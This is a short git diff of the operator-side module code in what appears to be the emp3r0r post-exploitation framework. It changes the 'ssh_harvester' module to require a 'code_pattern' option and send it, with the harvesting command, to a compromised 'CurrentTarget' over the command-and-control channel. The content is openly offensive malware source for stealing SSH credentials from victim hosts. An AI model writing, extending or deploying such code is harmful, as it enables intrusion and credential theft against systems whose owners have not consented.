@@ -3,14 +3,23 @@
 
 package cc
 
-import emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
+import (
+	"fmt"
+
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
+)
 
 func module_ssh_harvester() {
 	if CurrentTarget == nil {
 		LogError("CurrentTarget is nil")
 		return
 	}
-	err := SendCmdToCurrentTarget(emp3r0r_def.C2CmdSSHHarvester, "")
+	code_pattern_opt, ok := CurrentModuleOptions["code_pattern"]
+	if !ok {
+		LogError("code_pattern not specified")
+		return
+	}
+	err := SendCmdToCurrentTarget(fmt.Sprintf("%s --code_pattern %s", emp3r0r_def.C2CmdSSHHarvester, code_pattern_opt.Val), "")
 	if err != nil {
 		LogError("SendCmd: %v", err)
 		return
